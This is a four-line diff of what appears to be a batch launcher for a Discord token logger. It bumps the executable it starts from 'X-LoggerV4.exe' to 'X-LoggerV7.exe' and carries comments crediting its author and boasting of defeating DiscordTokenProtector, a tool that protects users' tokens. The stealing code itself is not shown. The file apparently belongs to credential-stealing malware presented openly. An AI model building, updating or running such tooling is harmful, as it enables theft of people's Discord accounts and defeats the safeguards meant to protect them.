@@ -1,4 +1,4 @@
-start X-LoggerV4.exe 
+start X-LoggerV7.exe 
 ::coded by elspiritdav4sbe
 
 ::DiscordTokenProtector pussy destroyer
